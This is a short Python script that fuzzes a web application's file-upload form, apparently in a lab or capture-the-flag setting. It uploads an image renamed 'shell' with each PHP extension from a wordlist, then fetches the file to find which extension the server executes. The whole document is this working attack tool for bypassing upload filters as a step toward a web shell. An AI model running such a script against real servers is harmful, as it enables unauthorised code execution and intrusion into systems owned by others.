import requests

url="http://138.68.165.36:32060"
mark = "462903"
with open("wordlist\php_extension.txt","r") as f:
  for e in f:
    ext = e.strip()

    files = {"uploadFile":(f"shell{ext}",open(r"C:\Users\marti\OneDrive\Desktop\img-worlds-of-adventure.jpg","rb"),"image/jpeg")}
    requests.post(f"{url}/upload.php",files=files,verify=False,proxies={"http":"http://127.0.0.1:8080"})
    r=requests.get(f"{url}/profile_images/shell{ext}")
    if r.status_code == 200 and mark in r.text:
      print(ext)